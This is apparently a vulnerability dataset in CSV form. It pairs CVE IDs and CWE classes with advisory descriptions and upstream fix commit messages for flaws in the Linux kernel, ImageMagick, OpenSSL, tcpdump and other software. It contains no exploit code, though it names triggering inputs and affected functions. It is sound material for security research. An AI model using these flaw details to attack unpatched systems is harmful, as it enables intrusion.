CVE-2017-18187,CWE-190,2018-02-14,"In ARM mbed TLS before 2.7.0, there is a bounds-check bypass through an integer overflow in PSK identity parsing in the ssl_parse_client_psk_identity() function in library/ssl_srv.c.","The check `if( *p + n > end )` in `ssl_parse_client_psk_identity` is unsafe because `*p + n` might overflow, thus bypassing the check. As `n` is a user-specified value up to 65K, this is relevant if the library happens to be located in the last 65K of virtual memory.  This commit replaces the check by a safe version."
CVE-2018-20511,CWE-200,2018-12-27,An issue was discovered in the Linux kernel before 4.18.11. The ipddp_ioctl function in drivers/net/appletalk/ipddp.c allows local users to obtain sensitive kernel address information by leveraging CAP_NET_ADMIN to read the ipddp_route dev and next fields via an SIOCFINDIPDDPRT ioctl call.,Fields ->dev and ->next of struct ipddp_route may be copied to userspace on the SIOCFINDIPDDPRT ioctl. This is only accessible to CAP_NET_ADMIN though. Let's manually copy the relevant fields instead of using memcpy().  BugLink: http://blog.infosectcbr.com.au/2018/09/linux-kernel-infoleaks.html Cc: Jann Horn <jannh@google.com> Signed-off-by: Willy Tarreau <w@1wt.eu> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2018-18586,CWE-22,2018-10-23,"chmextract.c in the chmextract sample program, as distributed with libmspack before 0.8alpha, does not protect against absolute/relative pathnames in CHM files, leading to Directory Traversal. NOTE: the vendor disputes that this is a libmspack vulnerability, because chmextract.c was only intended as a source-code example, not a supported application",
CVE-2016-10067,CWE-119,2017-03-02,"magick/memory.c in ImageMagick before 6.9.4-5 allows remote attackers to cause a denial of service (application crash) via vectors involving ""too many exceptions,"" which trigger a buffer overflow.",
CVE-2014-4943,CWE-269,2014-07-19,The PPPoL2TP feature in net/l2tp/l2tp_ppp.c in the Linux kernel through 3.15.6 allows local users to gain privileges by leveraging data-structure differences between an l2tp socket and an inet socket.,"The l2tp [get|set]sockopt() code has fallen back to the UDP functions for socket option levels != SOL_PPPOL2TP since day one, but that has never actually worked, since the l2tp socket isn't an inet socket.  As David Miller points out:    ""If we wanted this to work, it'd have to look up the tunnel and then    use tunnel->sk, but I wonder how useful that would be""  Since this can never have worked so nobody could possibly have depended on that functionality, just remove the broken code and return -EINVAL.  Reported-by: Sasha Levin <sasha.levin@oracle.com> Acked-by: James Chapman <jchapman@katalix.com> Acked-by: David Miller <davem@davemloft.net> Cc: Phil Turnbull <phil.turnbull@oracle.com> Cc: Vegard Nossum <vegard.nossum@oracle.com> Cc: Willy Tarreau <w@1wt.eu> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2014-4653,CWE-416,2014-07-03,"sound/core/control.c in the ALSA control implementation in the Linux kernel before 3.15.2 does not ensure possession of a read/write lock, which allows local users to cause a denial of service (use-after-free) and obtain sensitive information from kernel memory by leveraging /dev/snd/controlCX access.",A control that is visible on the card->controls list can be freed at any time. This means we must not access any of its memory while not holding the controls_rw_lock. Otherwise we risk a use after free access.  Signed-off-by: Lars-Peter Clausen <lars@metafoo.de> Acked-by: Jaroslav Kysela <perex@perex.cz> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>
CVE-2011-1759,CWE-189,2012-06-13,"Integer overflow in the sys_oabi_semtimedop function in arch/arm/kernel/sys_oabi-compat.c in the Linux kernel before 2.6.39 on the ARM platform, when CONFIG_OABI_COMPAT is enabled, allows local users to gain privileges or cause a denial of service (heap memory corruption) by providing a crafted argument and leveraging a race condition.","When CONFIG_OABI_COMPAT is set, the wrapper for semtimedop does not bound the nsops argument.  A sufficiently large value will cause an integer overflow in allocation size, followed by copying too much data into the allocated buffer.  Fix this by restricting nsops to SEMOPM. Untested.  Cc: stable@kernel.org Signed-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Signed-off-by: Russell King <rmk+kernel@arm.linux.org.uk>"
CVE-2014-8709,CWE-200,2014-11-10,"The ieee80211_fragment function in net/mac80211/tx.c in the Linux kernel before 3.13.5 does not properly maintain a certain tail pointer, which allows remote attackers to obtain sensitive cleartext information by reading packets.","The ""new"" fragmentation code (since my rewrite almost 5 years ago) erroneously sets skb->len rather than using skb_trim() to adjust the length of the first fragment after copying out all the others. This leaves the skb tail pointer pointing to after where the data originally ended, and thus causes the encryption MIC to be written at that point, rather than where it belongs: immediately after the data.  The impact of this is that if software encryption is done, then  a) encryption doesn't work for the first fragment, the connection     becomes unusable as the first fragment will never be properly     verified at the receiver, the MIC is practically guaranteed to     be wrong  b) we leak up to 8 bytes of plaintext (!) of the packet out into     the air  This is only mitigated by the fact that many devices are capable of doing encryption in hardware, in which case this can't happen as the tail pointer is irrelevant in that case. Additionally, fragmentation is not used very frequently and would normally have to be configured manually.  Fix this by using skb_trim() properly.  Cc: stable@vger.kernel.org Fixes: 2de8e0d (""mac80211: rewrite fragmentation"") Reported-by: Jouni Malinen <j@w1.fi> Signed-off-by: Johannes Berg <johannes.berg@intel.com>"
CVE-2016-10150,CWE-264,2017-02-06,Use-after-free vulnerability in the kvm_ioctl_create_device function in virt/kvm/kvm_main.c in the Linux kernel before 4.8.13 allows host OS users to cause a denial of service (host OS crash) or possibly gain privileges via crafted ioctl calls on the /dev/kvm device.,"We should move the ops->destroy(dev) after the list_del(&dev->vm_node) so that we don't use ""dev"" after freeing it.  Fixes: a28ebea (""KVM: Protect device ops->create and list_add with kvm->lock"") Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Reviewed-by: David Hildenbrand <david@redhat.com> Signed-off-by: Radim Krčmář <rkrcmar@redhat.com>"
CVE-2017-8326,CWE-682,2017-04-29,"libimageworsener.a in ImageWorsener before 1.3.1 has ""left shift cannot be represented in type int"" undefined behavior issues, which might allow remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted image, related to imagew-bmp.c and imagew-util.c.",Fixes issue #16
CVE-2017-7501,CWE-59,2017-11-22,"It was found that versions of rpm before 4.13.0.2 use temporary files with predictable names when installing an RPM. An attacker with ability to write in a directory where files will be installed could create symbolic links to an arbitrary location and modify content, and possibly permissions to arbitrary files, which could be used for denial of service or possibly privilege escalation.","Open newly created files with O_EXCL to prevent symlink tricks. When reopening hardlinks for writing the actual content, use append mode instead. This is compatible with the write-only permissions but is not destructive in case we got redirected to somebody elses file, verify the target before actually writing anything.  As these are files with the temporary suffix, errors mean a local user with sufficient privileges to break the installation of the package anyway is trying to goof us on purpose, don't bother trying to mend it (we couldn't fix the hardlink case anyhow) but just bail out.  Based on a patch by Florian Festi."
CVE-2016-5358,CWE-20,2016-08-07,"epan/dissectors/packet-pktap.c in the Ethernet dissector in Wireshark 2.x before 2.0.4 mishandles the packet-header data type, which allows remote attackers to cause a denial of service (application crash) via a crafted packet.",We now require that.  Make it so.  Bug: 12440 Change-Id: Iffee520976b013800699bde3c6092a3e86be0d76 Reviewed-on: https://code.wireshark.org/review/15424 Reviewed-by: Guy Harris <guy@alum.mit.edu>
CVE-2016-10059,CWE-119,2017-03-23,Buffer overflow in coders/tiff.c in ImageMagick before 6.9.4-1 allows remote attackers to cause a denial of service (application crash) or have unspecified other impact via a crafted TIFF file.,
CVE-2017-9207,CWE-125,2017-05-23,"The iw_get_ui16be function in imagew-util.c:422:24 in libimageworsener.a in ImageWorsener 1.3.1 allows remote attackers to cause a denial of service (heap-based buffer over-read) via a crafted image, related to imagew-jpeg.c.","Fixes issues #22, #23, #24, #25"
CVE-2016-10507,CWE-190,2017-08-30,Integer overflow vulnerability in the bmp24toimage function in convertbmp.c in OpenJPEG before 2.2.0 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) via a crafted bmp file.,Fix issue 833.
CVE-2014-4345,CWE-189,2014-08-14,"Off-by-one error in the krb5_encode_krbsecretkey function in plugins/kdb/ldap/libkdb_ldap/ldap_principal2.c in the LDAP KDB module in kadmind in MIT Kerberos 5 (aka krb5) 1.6.x through 1.11.x before 1.11.6 and 1.12.x before 1.12.2 allows remote authenticated users to cause a denial of service (buffer overflow) or possibly execute arbitrary code via a series of ""cpw -keepold"" commands.","For principal entries having keys with multiple kvnos (due to use of -keepold), the LDAP KDB module makes an attempt to store all the keys having the same kvno into a single krbPrincipalKey attribute value. There is a fencepost error in the loop, causing currkvno to be set to the just-processed value instead of the next kvno.  As a result, the second and all following groups of multiple keys by kvno are each stored in two krbPrincipalKey attribute values.  Fix the loop to use the correct kvno value.  CVE-2014-4345:  In MIT krb5, when kadmind is configured to use LDAP for the KDC database, an authenticated remote attacker can cause it to perform an out-of-bounds write (buffer overrun) by performing multiple cpw -keepold operations.  An off-by-one error while copying key information to the new database entry results in keys sharing a common kvno being written to different array buckets, in an array whose size is determined by the number of kvnos present.  After sufficient iterations, the extra writes extend past the end of the (NULL-terminated) array.  The NULL terminator is always written after the end of the loop, so no out-of-bounds data is read, it is only written.  Historically, it has been possible to convert an out-of-bounds write into remote code execution in some cases, though the necessary exploits must be tailored to the individual application and are usually quite complicated.  Depending on the allocated length of the array, an out-of-bounds write may also cause a segmentation fault and/or application crash.      CVSSv2 Vector: AV:N/AC:M/Au:S/C:C/I:C/A:C/E:POC/RL:OF/RC:C  [ghudson@mit.edu: clarified commit message] [kaduk@mit.edu: CVE summary, CVSSv2 vector]  (cherry picked from commit 81c332e)  ticket: 7980 version_fixed: 1.12.2 status: resolved"
CVE-2018-10191,CWE-190,2018-04-17,"In versions of mruby up to and including 1.4.0, an integer overflow exists in src/vm.c::mrb_vm_exec() when handling OP_GETUPVAR in the presence of deep scope nesting, resulting in a use-after-free. An attacker that can cause Ruby code to be run can use this to possibly execute arbitrary code.",
CVE-2014-3153,CWE-264,2014-06-07,"The futex_requeue function in kernel/futex.c in the Linux kernel through 3.14.5 does not ensure that calls have two different futex addresses, which allows local users to gain privileges via a crafted FUTEX_REQUEUE command that facilitates unsafe waiter modification.","If uaddr == uaddr2, then we have broken the rule of only requeueing from a non-pi futex to a pi futex with this call.  If we attempt this, then dangling pointers may be left for rt_waiter resulting in an exploitable condition.  This change brings futex_requeue() in line with futex_wait_requeue_pi() which performs the same check as per commit 6f7b0a2 (""futex: Forbid uaddr == uaddr2 in futex_wait_requeue_pi()"")  [ tglx: Compare the resulting keys as well, as uaddrs might be   	different depending on the mapping ]  Fixes CVE-2014-3153.  Reported-by: Pinkie Pie Signed-off-by: Will Drewry <wad@chromium.org> Signed-off-by: Kees Cook <keescook@chromium.org> Cc: stable@vger.kernel.org Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Reviewed-by: Darren Hart <dvhart@linux.intel.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2018-7253,CWE-125,2018-02-19,The ParseDsdiffHeaderConfig function of the cli/dsdiff.c file of WavPack 5.1.0 allows a remote attacker to cause a denial-of-service (heap-based buffer over-read) or possibly overwrite the heap via a maliciously crafted DSDIFF file.,
CVE-2017-13044,CWE-125,2017-09-14,The HNCP parser in tcpdump before 4.9.2 has a buffer over-read in print-hncp.c:dhcpv4_print().,"dhcpv4_print() in print-hncp.c had the same bug as dhcpv6_print(), apply a fix along the same lines.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2016-3841,CWE-264,2016-08-06,"The IPv6 stack in the Linux kernel before 4.3.3 mishandles options data, which allows local users to gain privileges or cause a denial of service (use-after-free and system crash) via a crafted sendmsg system call.","This patch addresses multiple problems :  UDP/RAW sendmsg() need to get a stable struct ipv6_txoptions while socket is not locked : Other threads can change np->opt concurrently. Dmitry posted a syzkaller (http://github.com/google/syzkaller) program desmonstrating use-after-free.  Starting with TCP/DCCP lockless listeners, tcp_v6_syn_recv_sock() and dccp_v6_request_recv_sock() also need to use RCU protection to dereference np->opt once (before calling ipv6_dup_options())  This patch adds full RCU protection to np->opt  Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2014-9803,CWE-19,2016-07-11,"arch/arm64/include/asm/pgtable.h in the Linux kernel before 3.15-rc5-next-20140519, as used in Android before 2016-07-05 on Nexus 5X and 6P devices, mishandles execute-only pages, which allows attackers to gain privileges via a crafted application, aka Android internal bug 28557020.","This reverts commit bc07c2c.  While the aim is increased security for --x memory maps, it does not protect against kernel level reads. Until SECCOMP is implemented for arm64, revert this patch to avoid giving a false idea of execute-only mappings.  Signed-off-by: Catalin Marinas <catalin.marinas@arm.com>"
CVE-2015-3905,CWE-119,2015-06-08,Buffer overflow in the set_cs_start function in t1disasm.c in t1utils before 1.39 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted font file.,"- Don't overflow the small cs_start buffer (reported by Niels   Thykier via the debian tracker (Jakub Wilk), found with a   fuzzer (""American fuzzy lop"")).  - Cast arguments to <ctype.h> functions to unsigned char."
CVE-2017-15906,CWE-732,2017-10-26,"The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.","Michal Zalewski, feedback & ok deraadt@"
CVE-2018-6196,CWE-835,2018-01-25,w3m through 0.5.3 is prone to an infinite recursion flaw in HTMLlineproc0 because the feed_table_block_tag function in table.c does not prevent a negative indent value.,Bug-Debian: #88
CVE-2018-12320,CWE-416,2018-06-13,There is a use after free in radare2 2.6.0 in r_anal_bb_free() in libr/anal/bb.c via a crafted Java binary file.,
CVE-2017-12897,CWE-125,2017-09-14,The ISO CLNS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:isoclns_print().,"This fixes a buffer over-read discovered by Kamil Frankowicz.  Don't pass the remaining caplen - that's too hard to get right, and we were getting it wrong in at least one case; just use ND_TTEST().  Add a test using the capture file supplied by the reporter(s)."
CVE-2018-6198,CWE-59,2018-01-25,"w3m through 0.5.3 does not properly handle temporary files when the ~/.w3m directory is unwritable, which allows a local attacker to craft a symlink attack to overwrite arbitrary files.",
CVE-2016-9388,CWE-617,2017-03-23,The ras_getcmap function in ras_dec.c in JasPer before 1.900.14 allows remote attackers to cause a denial of service (assertion failure) via a crafted image file.,with assertions instead of being gracefully handled.
CVE-2014-3597,CWE-119,2014-08-23,"Multiple buffer overflows in the php_parserr function in ext/standard/dns.c in PHP before 5.4.32 and 5.5.x before 5.5.16 allow remote DNS servers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted DNS record, related to the dns_get_record function and the dn_expand function.  NOTE: this issue exists because of an incomplete fix for CVE-2014-4049.",Incomplete fix for CVE-2014-4049  Check possible buffer overflow - pass real buffer end to dn_expand calls - check buffer len before each read
CVE-2016-6515,CWE-20,2016-08-07,"The auth_password function in auth-passwd.c in sshd in OpenSSH before 7.3 does not limit password lengths for password authentication, which allows remote attackers to cause a denial of service (crypt CPU consumption) via a long string.","Skip passwords longer than 1k in length so clients can't easily DoS sshd by sending very long passwords, causing it to spend CPU hashing them. feedback djm@, ok markus@.  Brought to our attention by tomas.kuthan at oracle.com, shilei-c at 360.cn and coredump at autistici.org  Upstream-ID: d0af7d4a2190b63ba1d38eec502bc4be0be9e333"
CVE-2014-9903,CWE-200,2016-06-27,"The sched_read_attr function in kernel/sched/core.c in the Linux kernel 3.14-rc before 3.14-rc4 uses an incorrect size, which allows local users to obtain sensitive information from kernel stack memory via a crafted sched_getattr system call.","We're copying the on-stack structure to userspace, but forgot to give the right number of bytes to copy. This allows the calling process to obtain up to PAGE_SIZE bytes from the stack (and possibly adjacent kernel memory).  This fix copies only as much as we actually have on the stack (attr->size defaults to the size of the struct) and leaves the rest of the userspace-provided buffer untouched.  Found using kmemcheck + trinity.  Fixes: d50dde5 (""sched: Add new scheduler syscalls to support an extended scheduling parameters ABI"") Cc: Dario Faggioli <raistlin@linux.it> Cc: Juri Lelli <juri.lelli@gmail.com> Cc: Ingo Molnar <mingo@kernel.org> Signed-off-by: Vegard Nossum <vegard.nossum@oracle.com> Signed-off-by: Peter Zijlstra <peterz@infradead.org> Link: http://lkml.kernel.org/r/1392585857-10725-1-git-send-email-vegard.nossum@oracle.com Signed-off-by: Thomas Gleixner <tglx@linutronix.de>"
CVE-2018-1000040,CWE-20,2018-05-24,"In Artifex MuPDF 1.12.0 and earlier, multiple use of uninitialized value bugs in the PDF parser could allow an attacker to cause a denial of service (crash) or influence program flow via a crafted file.",
CVE-2012-0028,CWE-264,2012-06-21,"The robust futex implementation in the Linux kernel before 2.6.28 does not properly handle processes that make exec system calls, which allows local users to cause a denial of service or possibly gain privileges by writing to a memory location in a child process.","We don't want to get rid of the futexes just at exit() time, we want to drop them when doing an execve() too, since that gets rid of the previous VM image too.  Doing it at mm_release() time means that we automatically always do it when we disassociate a VM map from the task.  Reported-by: pageexec@freemail.hu Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Nick Piggin <npiggin@suse.de> Cc: Hugh Dickins <hugh@veritas.com> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: Brad Spengler <spender@grsecurity.net> Cc: Alex Efros <powerman@powerman.name> Cc: Peter Zijlstra <a.p.zijlstra@chello.nl> Cc: Oleg Nesterov <oleg@redhat.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2014-3184,CWE-119,2014-09-28,"The report_fixup functions in the HID subsystem in the Linux kernel before 3.16.2 might allow physically proximate attackers to cause a denial of service (out-of-bounds write) via a crafted device that provides a small report descriptor, related to (1) drivers/hid/hid-cherry.c, (2) drivers/hid/hid-kye.c, (3) drivers/hid/hid-lg.c, (4) drivers/hid/hid-monterey.c, (5) drivers/hid/hid-petalynx.c, and (6) drivers/hid/hid-sunplus.c.",There are a few very theoretical off-by-one bugs in report descriptor size checking when performing a pre-parsing fixup. Fix those.  Cc: stable@vger.kernel.org Reported-by: Ben Hawkes <hawkes@google.com> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>
CVE-2019-13304,CWE-787,2019-07-05,ImageMagick 7.0.8-50 Q16 has a stack-based buffer overflow at coders/pnm.c in WritePNMImage because of a misplaced assignment.,
CVE-2018-14357,CWE-78,2018-07-17,"An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. They allow remote IMAP servers to execute arbitrary commands via backquote characters, related to the mailboxes command associated with an automatic subscription.",Co-authored-by: JerikoOne <jeriko.one@gmx.us>
CVE-2013-7339,CWE-476,2014-03-24,The rds_ib_laddr_check function in net/rds/ib.c in the Linux kernel before 3.12.8 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via a bind system call for an RDS socket on a system that lacks RDS transports.,"Binding might result in a NULL device, which is dereferenced causing this BUG:  [ 1317.260548] BUG: unable to handle kernel NULL pointer dereference at 000000000000097 4 [ 1317.261847] IP: [<ffffffff84225f52>] rds_ib_laddr_check+0x82/0x110 [ 1317.263315] PGD 418bcb067 PUD 3ceb21067 PMD 0 [ 1317.263502] Oops: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC [ 1317.264179] Dumping ftrace buffer: [ 1317.264774]    (ftrace buffer empty) [ 1317.265220] Modules linked in: [ 1317.265824] CPU: 4 PID: 836 Comm: trinity-child46 Tainted: G        W    3.13.0-rc4- next-20131218-sasha-00013-g2cebb9b-dirty #4159 [ 1317.267415] task: ffff8803ddf33000 ti: ffff8803cd31a000 task.ti: ffff8803cd31a000 [ 1317.268399] RIP: 0010:[<ffffffff84225f52>]  [<ffffffff84225f52>] rds_ib_laddr_check+ 0x82/0x110 [ 1317.269670] RSP: 0000:ffff8803cd31bdf8  EFLAGS: 00010246 [ 1317.270230] RAX: 0000000000000000 RBX: ffff88020b0dd388 RCX: 0000000000000000 [ 1317.270230] RDX: ffffffff8439822e RSI: 00000000000c000a RDI: 0000000000000286 [ 1317.270230] RBP: ffff8803cd31be38 R08: 0000000000000000 R09: 0000000000000000 [ 1317.270230] R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000000 [ 1317.270230] R13: 0000000054086700 R14: 0000000000a25de0 R15: 0000000000000031 [ 1317.270230] FS:  00007ff40251d700(0000) GS:ffff88022e200000(0000) knlGS:000000000000 0000 [ 1317.270230] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [ 1317.270230] CR2: 0000000000000974 CR3: 00000003cd478000 CR4: 00000000000006e0 [ 1317.270230] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 [ 1317.270230] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000090602 [ 1317.270230] Stack: [ 1317.270230]  0000000054086700 5408670000a25de0 5408670000000002 0000000000000000 [ 1317.270230]  ffffffff84223542 00000000ea54c767 0000000000000000 ffffffff86d26160 [ 1317.270230]  ffff8803cd31be68 ffffffff84223556 ffff8803cd31beb8 ffff8800c6765280 [ 1317.270230] Call Trace: [ 1317.270230]  [<ffffffff84223542>] ? rds_trans_get_preferred+0x42/0xa0 [ 1317.270230]  [<ffffffff84223556>] rds_trans_get_preferred+0x56/0xa0 [ 1317.270230]  [<ffffffff8421c9c3>] rds_bind+0x73/0xf0 [ 1317.270230]  [<ffffffff83e4ce62>] SYSC_bind+0x92/0xf0 [ 1317.270230]  [<ffffffff812493f8>] ? context_tracking_user_exit+0xb8/0x1d0 [ 1317.270230]  [<ffffffff8119313d>] ? trace_hardirqs_on+0xd/0x10 [ 1317.270230]  [<ffffffff8107a852>] ? syscall_trace_enter+0x32/0x290 [ 1317.270230]  [<ffffffff83e4cece>] SyS_bind+0xe/0x10 [ 1317.270230]  [<ffffffff843a6ad0>] tracesys+0xdd/0xe2 [ 1317.270230] Code: 00 8b 45 cc 48 8d 75 d0 48 c7 45 d8 00 00 00 00 66 c7 45 d0 02 00 89 45 d4 48 89 df e8 78 49 76 ff 41 89 c4 85 c0 75 0c 48 8b 03 <80> b8 74 09 00 00 01 7 4 06 41 bc 9d ff ff ff f6 05 2a b6 c2 02 [ 1317.270230] RIP  [<ffffffff84225f52>] rds_ib_laddr_check+0x82/0x110 [ 1317.270230]  RSP <ffff8803cd31bdf8> [ 1317.270230] CR2: 0000000000000974  Signed-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-9142,CWE-20,2017-05-22,"In ImageMagick 7.0.5-7 Q16, a crafted file could trigger an assertion failure in the WriteBlob function in MagickCore/blob.c because of missing checks in the ReadOneJNGImage function in coders/png.c.",
CVE-2018-20855,CWE-119,2019-07-26,"An issue was discovered in the Linux kernel before 4.18.7. In create_qp_common in drivers/infiniband/hw/mlx5/qp.c, mlx5_ib_create_qp_resp was never initialized, resulting in a leak of stack memory to userspace.","mlx5_ib_create_qp_resp was never initialized and only the first 4 bytes were written.  Fixes: 41d902c (""RDMA/mlx5: Fix definition of mlx5_ib_create_qp_resp"") Cc: <stable@vger.kernel.org> Acked-by: Leon Romanovsky <leonro@mellanox.com> Signed-off-by: Jason Gunthorpe <jgg@mellanox.com>"
CVE-2017-6194,CWE-119,2017-04-03,The relocs function in libr/bin/p/bin_bflt.c in radare2 1.2.1 allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted binary file.,
CVE-2018-15908,,2018-08-27,"In Artifex Ghostscript 9.23 before 2018-08-23, attackers are able to supply malicious PostScript files to bypass .tempfile restrictions and write files.",
CVE-2017-14058,CWE-835,2017-08-31,"In FFmpeg 2.4 and 3.3.3, the read_data function in libavformat/hls.c does not restrict reload attempts for an insufficient list, which allows remote attackers to cause a denial of service (infinite loop).",Fixes: loop.m3u  The default max iteration count of 1000 is arbitrary and ideas for a better solution are welcome  Found-by: Xiaohei and Wangchu from Alibaba Security Team  Previous version reviewed-by: Steven Liu <lingjiujianke@gmail.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc> (cherry picked from commit 7ec4148) Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2015-3214,CWE-119,2015-08-31,"The pit_ioport_read in i8254.c in the Linux kernel before 2.6.33 and QEMU before 2.3.1 does not distinguish between read lengths and write lengths, which might allow guest OS users to execute arbitrary code on the host OS by triggering use of an invalid index.","PIT control word (address 0x43) is write-only, reads are undefined.  Cc: stable@kernel.org Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>"
CVE-2016-9294,CWE-476,2016-11-12,"Artifex Software, Inc. MuJS before 5008105780c0b0182ea6eda83ad5598f225be3ee allows context-dependent attackers to conduct ""denial of service (application crash)"" attacks by using the ""malformed labeled break/continue in JavaScript"" approach, related to a ""NULL pointer dereference"" issue affecting the jscompile.c component.",
CVE-2017-14151,CWE-119,2017-09-05,"An off-by-one error was discovered in opj_tcd_code_block_enc_allocate_data in lib/openjp2/tcd.c in OpenJPEG 2.2.0. The vulnerability causes an out-of-bounds write, which may lead to remote denial of service (heap-based buffer overflow affecting opj_mqc_flush in lib/openjp2/mqc.c and opj_t1_encode_cblk in lib/openjp2/t1.c) or possibly remote code execution.",
CVE-2016-3179,CWE-416,2017-03-24,The processRequest function in minissdpd.c in MiniSSDPd 1.2.20130907-3 allows local users to cause a denial of service (invalid free and daemon crash) via vectors related to error handling.,
CVE-2018-6927,CWE-190,2018-02-12,The futex_requeue function in kernel/futex.c in the Linux kernel before 4.14.15 might allow attackers to cause a denial of service (integer overflow) or possibly have unspecified other impact by triggering a negative wake or requeue value.,UBSAN reports signed integer overflow in kernel/futex.c:   UBSAN: Undefined behaviour in kernel/futex.c:2041:18  signed integer overflow:  0 - -2147483648 cannot be represented in type 'int'  Add a sanity check to catch negative values of nr_wake and nr_requeue.  Signed-off-by: Li Jinyue <lijinyue@huawei.com> Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Cc: peterz@infradead.org Cc: dvhart@infradead.org Cc: stable@vger.kernel.org Link: https://lkml.kernel.org/r/1513242294-31786-1-git-send-email-lijinyue@huawei.com
CVE-2018-16790,CWE-125,2018-09-10,"_bson_iter_next_internal in bson-iter.c in libbson 1.12.0, as used in MongoDB mongo-c-driver and other products, has a heap-based buffer over-read via a crafted bson buffer.","As reported here: https://jira.mongodb.org/browse/CDRIVER-2819, a heap overread occurs due a failure to correctly verify data bounds.  In the original check, len - o returns the data left including the sizeof(l) we just read. Instead, the comparison should check against the data left NOT including the binary int32, i.e. just subtype (byte*) instead of int32 subtype (byte*).  Added in test for corrupted BSON example."
CVE-2017-13725,CWE-125,2017-09-14,The IPv6 routing header parser in tcpdump before 4.9.2 has a buffer over-read in print-rt6.c:rt6_print().,"Don't fetch the length field from the header until after we've checked for the existence of a field at or after that field.  (Found by code inspection, not by a capture.)"
CVE-2015-5194,CWE-20,2017-07-21,The log_config_command function in ntp_parser.y in ntpd in NTP before 4.2.7p42 allows remote attackers to cause a denial of service (ntpd crash) via crafted logconfig commands.,
CVE-2015-8963,CWE-362,2016-11-16,Race condition in kernel/events/core.c in the Linux kernel before 4.4 allows local users to gain privileges or cause a denial of service (use-after-free) by leveraging incorrect handling of an swevent data structure during a CPU unplug operation.,"There's a race on CPU unplug where we free the swevent hash array while it can still have events on. This will result in a use-after-free which is BAD.  Simply do not free the hash array on unplug. This leaves the thing around and no use-after-free takes place.  When the last swevent dies, we do a for_each_possible_cpu() iteration anyway to clean these up, at which time we'll free it, so no leakage will occur.  Reported-by: Sasha Levin <sasha.levin@oracle.com> Tested-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Cc: Arnaldo Carvalho de Melo <acme@redhat.com> Cc: Frederic Weisbecker <fweisbec@gmail.com> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Stephane Eranian <eranian@google.com> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: Vince Weaver <vincent.weaver@maine.edu> Signed-off-by: Ingo Molnar <mingo@kernel.org>"
CVE-2014-0195,CWE-120,2014-06-05,"The dtls1_reassemble_fragment function in d1_both.c in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h does not properly validate fragment lengths in DTLS ClientHello messages, which allows remote attackers to execute arbitrary code or cause a denial of service (buffer overflow and application crash) via a long non-initial fragment.",
CVE-2015-8953,CWE-399,2016-10-16,"fs/overlayfs/copy_up.c in the Linux kernel before 4.2.6 uses an incorrect cleanup code path, which allows local users to cause a denial of service (dentry reference leak) via filesystem operations on a large file in a lower overlayfs layer.",
CVE-2016-10064,CWE-119,2017-03-02,Buffer overflow in coders/tiff.c in ImageMagick before 6.9.5-1 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted file.,
CVE-2016-3841,CWE-264,2016-08-06,"The IPv6 stack in the Linux kernel before 4.3.3 mishandles options data, which allows local users to gain privileges or cause a denial of service (use-after-free and system crash) via a crafted sendmsg system call.","This patch addresses multiple problems :  UDP/RAW sendmsg() need to get a stable struct ipv6_txoptions while socket is not locked : Other threads can change np->opt concurrently. Dmitry posted a syzkaller (http://github.com/google/syzkaller) program desmonstrating use-after-free.  Starting with TCP/DCCP lockless listeners, tcp_v6_syn_recv_sock() and dccp_v6_request_recv_sock() also need to use RCU protection to dereference np->opt once (before calling ipv6_dup_options())  This patch adds full RCU protection to np->opt  Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
